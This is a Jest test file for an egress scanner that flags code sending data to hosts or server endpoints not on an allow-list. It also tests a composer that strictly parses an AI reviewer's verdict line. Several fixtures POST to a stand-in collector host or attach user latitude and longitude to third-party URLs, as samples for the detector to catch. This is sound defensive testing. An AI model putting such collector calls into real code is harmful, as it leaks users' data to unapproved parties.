// Tests for the user data egress check: the deterministic scanner
// (scripts/security-scan-egress.mjs) and the record composer
// (scripts/egress-check-record.mjs). Both are run as child processes because the
// Jest config maps every .mjs import to a stub.

const {spawnSync} = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');

const ROOT = path.resolve(__dirname, '..');
const SCANNER = path.join(ROOT, 'scripts', 'security-scan-egress.mjs');
const RECORD = path.join(ROOT, 'scripts', 'egress-check-record.mjs');

function tmpDir() {
    return fs.mkdtempSync(path.join(os.tmpdir(), 'egress-test-'));
}

function run(script, args, cwd = ROOT) {
    return spawnSync(process.execPath, [script, ...args], {cwd, encoding: 'utf8', maxBuffer: 1 << 26});
}

// A minimal unified diff that adds `lines` to `file`.
function diffFor(file, lines, {isNew = false} = {}) {
    const header = isNew
        ? `diff --git a/${file} b/${file}\nnew file mode 100644\n--- /dev/null\n+++ b/${file}\n`
        : `diff --git a/${file} b/${file}\n--- a/${file}\n+++ b/${file}\n`;
    return header + `@@ -0,0 +1,${lines.length} @@\n` + lines.map(l => '+' + l).join('\n') + '\n';
}

function scan(diffText, extraArgs = []) {
    const dir = tmpDir();
    const f = path.join(dir, 'push.diff');
    fs.writeFileSync(f, diffText);
    const r = run(SCANNER, ['--diff-file', f, '--json', ...extraArgs]);
    expect(r.stderr).not.toMatch(/security-scan-egress:/);
    expect(r.status).toBe(0);
    return JSON.parse(r.stdout);
}

describe('security-scan-egress: destinations', () => {
    test('a destination not in the allow-list is reported and turns the verdict to ATTENTION', () => {
        const r = scan(diffFor('src/Foo.js', ['    const res = await fetch("https://collector.example-not-ignored.net/ingest", {method: "POST"});']));
        expect(r.verdict).toBe('ATTENTION');
        expect(r.unknownHosts.map(h => h.host)).toEqual(['collector.example-not-ignored.net']);
        expect(r.sinks.map(s => s.kind)).toContain('fetch');
        expect(r.reasons.join(' ')).toMatch(/1 destination\(s\) not in the allow-list/);
    });

    test('an allow-listed destination is CLEAR and carries its contract', () => {
        const r = scan(diffFor('src/Foo.js', ['    fetch(`https://services.arcgisonline.com/x/${z}/${y}/${x}`);']));
        expect(r.verdict).toBe('CLEAR');
        expect(r.unknownHosts).toEqual([]);
        expect(r.knownHosts[0]).toMatchObject({host: 'services.arcgisonline.com', mayReceive: ['coarse-area']});
    });

    test('wildcard entries match sub-domains', () => {
        const r = scan(diffFor('src/Foo.js', ['    const url = "https://mybucket.s3.eu-west-1.amazonaws.com/" + key;']));
        expect(r.verdict).toBe('CLEAR');
        expect(r.knownHosts[0].host).toBe('mybucket.s3.eu-west-1.amazonaws.com');
    });

    test('placeholder and local names are never destinations', () => {
        const r = scan(diffFor('src/Foo.js', [
            '    const a = "https://tiles.example.org/x";',
            '    const b = "https://localhost/x";',
            '    const c = "https://local.invalid/x";',
        ]));
        expect(r.unknownHosts).toEqual([]);
        expect(r.knownHosts).toEqual([]);
    });

    test('links in comments are not requests', () => {
        const r = scan(diffFor('src/Foo.js', [
            '    // see https://reference.example-not-ignored.net/spec',
            '    /* https://another.example-not-ignored.net */',
            '     * https://third.example-not-ignored.net',
            '    doThing(); // https://fourth.example-not-ignored.net',
        ]));
        expect(r.unknownHosts).toEqual([]);
    });

    test('a URL whose host is decided at run time is listed for review', () => {
        const r = scan(diffFor('src/Foo.js', ['    fetch(`https://${host}/api?q=1`);']));
        expect(r.dynamicUrls).toHaveLength(1);
        expect(r.verdict).toBe('CLEAR');
    });
});

describe('security-scan-egress: server endpoints', () => {
    test('a known endpoint is CLEAR; an unknown one is ATTENTION', () => {
        const ok = scan(diffFor('src/Foo.js', ['    fetch(SITREC_SERVER + "uilog.php", {method: "POST", body});']));
        expect(ok.verdict).toBe('CLEAR');
        expect(ok.knownEndpoints[0]).toMatchObject({endpoint: 'uilog.php', mayReceive: ['usage-stats']});
        expect(ok.sinks.map(s => s.kind)).toEqual(expect.arrayContaining(['fetch', 'server endpoint']));

        const bad = scan(diffFor('src/Foo.js', ['    fetch(SITREC_SERVER + "collect.php", {method: "POST", body});']));
        expect(bad.verdict).toBe('ATTENTION');
        expect(bad.unknownEndpoints.map(e => e.endpoint)).toEqual(['collect.php']);
    });

    test('a new server-side file without an allow-list entry is ATTENTION; with one it is not', () => {
        const r = scan(diffFor('sitrecServer/newthing.php', ['<?php', 'echo 1;'], {isNew: true}));
        expect(r.verdict).toBe('ATTENTION');
        expect(r.newServerFiles).toEqual(['sitrecServer/newthing.php']);

        const listed = scan(diffFor('sitrecServer/record_visit.php', ['<?php', 'echo 1;'], {isNew: true}));
        expect(listed.verdict).toBe('CLEAR');
        expect(listed.newServerFiles).toEqual([]);
    });

    test('a .php name inside a third-party URL belongs to that host, not to our server', () => {
        const r = scan(diffFor('src/Foo.js', ['    fetch("https://celestrak.org/NORAD/elements/gp.php?GROUP=active&FORMAT=csv");']));
        expect(r.unknownEndpoints).toEqual([]);
        expect(r.knownEndpoints).toEqual([]);
        expect(r.knownHosts[0].host).toBe('celestrak.org');
        expect(r.verdict).toBe('CLEAR');
    });

    test('the audit contract retains both local sinks without approving remote collectors or raw positions', () => {
        const local = scan(diffFor('sitrecServer/audit.php', [
            '<?php', 'error_log($line);', 'syslog(LOG_INFO, $line);',
        ], {isNew: true}));
        expect(local.verdict).toBe('CLEAR');
        expect(local.newServerFiles).toEqual([]);
        expect(local.sinks.filter(s => s.kind === 'log')).toHaveLength(2);

        const remote = scan(diffFor('sitrecServer/audit.php', [
            '<?php', 'file_get_contents("https://collector.example-not-ignored.net/ingest");',
        ]));
        expect(remote.verdict).toBe('ATTENTION');
        expect(remote.unknownHosts.map(h => h.host)).toContain('collector.example-not-ignored.net');

        const position = scan(diffFor('src/Foo.js', [
            'fetch(SITREC_SERVER + "audit.php?lat=" + lat + "&lon=" + lon);',
        ]));
        expect(position.verdict).toBe('ATTENTION');
        expect(position.overBudget[0]).toMatchObject({destination: 'audit.php', mayReceive: ['audit-metadata']});
    });

    test('loopback addresses are never destinations', () => {
        const r = scan(diffFor('src/Foo.js', ['    fetch(`http://127.0.0.1:${port}/probe`);']));
        expect(r.unknownHosts).toEqual([]);
        expect(r.verdict).toBe('CLEAR');
    });

    test('.php names inside server-side code are includes, not endpoints', () => {
        const r = scan(diffFor('sitrecServer/existing.php', ["require_once __DIR__ . '/somethingnew.php';"]));
        expect(r.unknownEndpoints).toEqual([]);
        expect(r.verdict).toBe('CLEAR');
    });
});

describe('security-scan-egress: the position rule', () => {
    test('a position sent to a destination whose contract has no position class is ATTENTION', () => {
        const r = scan(diffFor('src/Foo.js', ['    fetch(`https://celestrak.org/NORAD/elements/gp.php?lat=${lat}&lon=${lon}`);']));
        expect(r.verdict).toBe('ATTENTION');
        expect(r.overBudget).toHaveLength(1);
        expect(r.overBudget[0]).toMatchObject({destination: 'celestrak.org', mayReceive: ['identifier']});
        expect(r.reasons.join(' ')).toMatch(/position\(s\) sent to a destination whose contract has no position class/);
    });

    test('a position sent to a destination whose contract allows it is CLEAR', () => {
        const r = scan(diffFor('src/Foo.js', ['    fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}`);']));
        expect(r.verdict).toBe('CLEAR');
        expect(r.overBudget).toEqual([]);
    });

    test('the rule also covers the server endpoints', () => {
        const r = scan(diffFor('src/Foo.js', ['    fetch(SITREC_SERVER + "uilog.php?lat=" + lat + "&lon=" + lon);']));
        expect(r.verdict).toBe('ATTENTION');
        expect(r.overBudget[0].destination).toBe('uilog.php');
    });

    test('a position on a URL line that names no destination is listed for review, not failed', () => {
        const r = scan(diffFor('src/Foo.js', ['    const url = base + `?lat=${lat}&lon=${lon}`;']));
        expect(r.verdict).toBe('CLEAR');
        expect(r.positionUrls).toHaveLength(1);
        expect(r.overBudget).toEqual([]);
    });
});

describe('security-scan-egress: scope', () => {
    test('files outside the scope are ignored', () => {
        const line = '    fetch("https://collector.example-not-ignored.net/x");';
        const r = scan([
            diffFor('docs/Notes.md', [line]),
            diffFor('sitrecServer/vendor/lib/x.php', [line]),
            diffFor('tests/foo.test.js', [line]),
            diffFor('tools/three.js/three.core.js', [line]),
            diffFor('data/x.json', [line]),
        ].join(''));
        expect(r.filesChanged).toBe(5);
        expect(r.filesInScope).toEqual([]);
        expect(r.verdict).toBe('CLEAR');
    });

    test('vendored code under src/js and the config templates are in scope', () => {
        const line = '    fetch("https://collector.example-not-ignored.net/x");';
        const r = scan(diffFor('src/js/vendored.js', [line]) + diffFor('config/config.js.example', [line]));
        expect(r.filesInScope).toEqual(['src/js/vendored.js', 'config/config.js.example']);
        expect(r.unknownHosts).toHaveLength(2);
    });

    test('server-side sinks are recognised in PHP', () => {
        const r = scan(diffFor('sitrecServer/proxy.php', [
            '$data = curlGetRequest($url);',
            'error_log("request " . $url);',
            'file_put_contents($cache, $data);',
        ]));
        expect(r.sinks.map(s => s.kind).sort()).toEqual(['curl', 'file write', 'log']);
    });
});

describe('security-scan-egress: the allow-list', () => {
    test('an entry with an unknown data class is rejected', () => {
        const dir = tmpDir();
        const bad = path.join(dir, 'allow.json');
        fs.writeFileSync(bad, JSON.stringify({
            hosts: [{host: 'x.example-not-ignored.net', purpose: 'p', trigger: 't', mayReceive: ['everything']}],
            serverEndpoints: [],
        }));
        const f = path.join(dir, 'push.diff');
        fs.writeFileSync(f, diffFor('src/Foo.js', ['let a = 1;']));
        const r = run(SCANNER, ['--diff-file', f, '--allowlist', bad]);
        expect(r.status).toBe(2);
        expect(r.stderr).toMatch(/unknown data class "everything"/);
    });

    test('the whole tracked tree matches the allow-list: no unlisted destination, no position over contract', () => {
        const r = run(SCANNER, ['--inventory', '--json']);
        expect(r.status).toBe(0);
        const inv = JSON.parse(r.stdout);
        expect(inv.unknownHosts.map(h => `${h.host} ${h.file}:${h.line}`)).toEqual([]);
        expect(inv.unknownEndpoints.map(e => `${e.endpoint} ${e.file}:${e.line}`)).toEqual([]);
        expect(inv.overBudget.map(o => `${o.destination} ${o.file}:${o.line}`)).toEqual([]);
        expect(inv.filesInScope.length).toBeGreaterThan(100);
    });
});

describe('egress-check-record', () => {
    function record(files, args = []) {
        const dir = tmpDir();
        for (const [name, content] of Object.entries(files)) fs.writeFileSync(path.join(dir, name), content);
        const r = run(RECORD, ['--dir', dir, '--model', 'test-model', '--run-url', 'https://runs.example/1', ...args]);
        expect(r.status).toBe(0);
        return {
            verdict: fs.readFileSync(path.join(dir, 'verdict.txt'), 'utf8').trim(),
            comment: fs.readFileSync(path.join(dir, 'comment.md'), 'utf8'),
            stdout: r.stdout,
        };
    }
    const scanJson = (verdict, inScope, extra = {}) => JSON.stringify({
        verdict, reasons: verdict === 'ATTENTION' ? ['1 destination(s) not in the allow-list'] : [],
        filesInScope: Array.from({length: inScope}, (_, i) => `src/F${i}.js`),
        sinks: [], unknownHosts: [], unknownEndpoints: [], overBudget: [], range: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa..bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb',
        ...extra,
    });

    test('CLEAR when both layers are clear', () => {
        const r = record({'scan.json': scanJson('CLEAR', 2), 'scan.md': '## Automated scan', 'review.md': 'Verdict: CLEAR\nExamined 2 files.', 'review.exit': '0'});
        expect(r.verdict).toBe('CLEAR');
        expect(r.comment).toMatch(/\*\*Verdict: CLEAR\*\*/);
        expect(r.comment).toMatch(/range `aaaaaaa\.\.bbbbbbb`/);
        expect(r.comment).toMatch(/review: test-model/);
    });

    test('ATTENTION when the review says so', () => {
        const r = record({'scan.json': scanJson('CLEAR', 2), 'scan.md': '', 'review.md': 'Verdict: ATTENTION\n- src/F0.js:3 sends the track to x.', 'review.exit': '0'});
        expect(r.verdict).toBe('ATTENTION');
    });

    test('ATTENTION when the scan says so, even with a clear review', () => {
        const r = record({'scan.json': scanJson('ATTENTION', 2), 'scan.md': '', 'review.md': 'Verdict: CLEAR', 'review.exit': '0'});
        expect(r.verdict).toBe('ATTENTION');
        expect(r.comment).toMatch(/Scan: 1 destination\(s\) not in the allow-list/);
    });

    test('INCOMPLETE when the review produced nothing', () => {
        const r = record({'scan.json': scanJson('CLEAR', 2), 'scan.md': '', 'review.md': '', 'review.exit': '1', 'review.stderr': 'model unavailable'});
        expect(r.verdict).toBe('INCOMPLETE');
        expect(r.comment).toMatch(/exit code 1/);
        expect(r.comment).toMatch(/model unavailable/);
    });

    test('INCOMPLETE when no exit status was recorded, even with a verdict line (a cancelled step)', () => {
        const r = record({'scan.json': scanJson('CLEAR', 2), 'scan.md': '', 'review.md': 'Verdict: CLEAR\nExamined 2 files.'});
        expect(r.verdict).toBe('INCOMPLETE');
        expect(r.comment).toMatch(/did not record an exit status; its output is partial/);
        expect(r.comment).toMatch(/Partial output, not a verdict/);
    });

    test('INCOMPLETE when the review exited 0 with no output', () => {
        const r = record({'scan.json': scanJson('CLEAR', 2), 'scan.md': '', 'review.md': '', 'review.exit': '0'});
        expect(r.verdict).toBe('INCOMPLETE');
        expect(r.comment).toMatch(/exited 0 but produced no output/);
    });

    test('INCOMPLETE when the review exited non-zero, even if a verdict line was printed', () => {
        const r = record({'scan.json': scanJson('CLEAR', 2), 'scan.md': '', 'review.md': 'Verdict: CLEAR\nExamined 2 files.', 'review.exit': '1'});
        expect(r.verdict).toBe('INCOMPLETE');
        expect(r.comment).toMatch(/exit code 1 after partial output/);
        expect(r.comment).toMatch(/Partial output, not a verdict/);
    });

    test('INCOMPLETE when the review states no verdict', () => {
        const r = record({'scan.json': scanJson('CLEAR', 2), 'scan.md': '', 'review.md': 'I looked at the files and everything is fine.', 'review.exit': '0'});
        expect(r.verdict).toBe('INCOMPLETE');
        expect(r.comment).toMatch(/printed no verdict line/);
    });

    // The verdict need not be the first line. The model sometimes announces its plan ahead
    // of it, which is what runs 33725452177 and 33791481215 did. But a verdict quoted back
    // — in a fence, a blockquote, a heading, or a sentence — is not a verdict, because the
    // review prompt itself carries both example lines verbatim.
    describe('finding the verdict line', () => {
        const withReview = md => record({'scan.json': scanJson('CLEAR', 2), 'scan.md': '', 'review.md': md, 'review.exit': '0'}).verdict;
        const lines = (...rows) => rows.join('\n');

        test('a plan sentence may precede a CLEAR verdict', () => {
            expect(withReview(lines('I\u2019ll inspect the scan, contract and scoped diff.', '', 'Verdict: CLEAR', '', 'Examined 2 files.'))).toBe('CLEAR');
        });

        test('a plan sentence may precede an ATTENTION verdict', () => {
            expect(withReview(lines('I will inspect the diff.', '', 'Verdict: ATTENTION', '', '- src/F0.js:3 sends the track to x.'))).toBe('ATTENTION');
        });

        test('a bold verdict counts', () => {
            expect(withReview('**Verdict: ATTENTION**\n\n- src/F0.js:3')).toBe('ATTENTION');
        });

        test('the more serious wins when the review states both', () => {
            expect(withReview(lines('Verdict: CLEAR', '', 'On reflection:', 'Verdict: ATTENTION'))).toBe('ATTENTION');
        });

        test('a verdict after a closed fence counts', () => {
            expect(withReview(lines('The offending code:', '', '```js', 'fetch(url)', '```', '', 'Verdict: ATTENTION'))).toBe('ATTENTION');
        });

        test('a CLEAR quoted in a fence does not count', () => {
            expect(withReview(lines('The format asks for:', '', '```', 'Verdict: CLEAR', '```', '', 'I ran out of credits.'))).toBe('INCOMPLETE');
        });

        test('a shorter fence nested in a longer one cannot re-expose a quoted CLEAR', () => {
            expect(withReview(lines('The prompt shows:', '', '````', 'Example:', '```', 'Verdict: CLEAR', '```', '````', '', 'I ran out of credits.'))).toBe('INCOMPLETE');
        });

        test('a tilde fence nested in a backtick fence cannot re-expose a quoted CLEAR', () => {
            expect(withReview(lines('Quote:', '', '```', '~~~', 'Verdict: CLEAR', '~~~', '```', '', 'unfinished'))).toBe('INCOMPLETE');
        });

        test('a fence marker carrying other content does not close the block', () => {
            expect(withReview(lines('Quote:', '', '```md', 'Verdict: CLEAR', '``` and so on', '', 'unfinished'))).toBe('INCOMPLETE');
        });

        test('an unterminated fence swallows everything after it', () => {
            expect(withReview(lines('Analysis.', '```', 'Verdict: CLEAR'))).toBe('INCOMPLETE');
        });

        test('a CLEAR in a blockquote does not count', () => {
            expect(withReview(lines('The prompt says:', '', '> Verdict: CLEAR', '', 'but I did not finish.'))).toBe('INCOMPLETE');
        });

        test('a CLEAR in a heading does not count', () => {
            expect(withReview('# Verdict: CLEAR')).toBe('INCOMPLETE');
        });

        test('a line that continues past the word is not a verdict', () => {
            expect(withReview('Verdict: CLEAR or ATTENTION, one of the two.')).toBe('INCOMPLETE');
        });
    });

    test('CLEAR with the review skipped when no code changed', () => {
        const r = record({'scan.json': scanJson('CLEAR', 0), 'scan.md': ''});
        expect(r.verdict).toBe('CLEAR');
        expect(r.comment).toMatch(/review: skipped/);
        expect(r.comment).toMatch(/no code changed/);
    });

    test('INCOMPLETE when the scan is missing', () => {
        const r = record({});
        expect(r.verdict).toBe('INCOMPLETE');
    });
});
